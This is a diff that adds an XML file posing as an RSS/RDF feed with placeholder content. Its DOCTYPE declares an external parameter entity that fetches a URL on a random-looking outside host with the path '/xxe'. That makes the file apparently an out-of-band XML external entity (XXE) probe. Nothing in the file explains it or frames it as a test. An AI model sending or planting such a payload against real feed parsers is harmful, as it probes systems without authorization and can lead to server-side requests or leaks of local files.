@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<?xml-stylesheet type="text/css" href="/css/rss.css" ?>
+<!DOCTYPE link [
+  <!ENTITY % a SYSTEM "http://m3qee5znwolxmgrc8zhk7bgtckib6bu0.twglbrv6pe.x9.to/xxe">
+]>
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns="http://purl.org/rss/1.0/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/"
+         xmlns:georss="http://www.georss.org/georss">
+  <docs>hello world</docs>
+  <link>http://example.com</link>
+  <title>Example</title>
+  <description></description>
+  <items>
+  </items>
+</rdf:RDF>
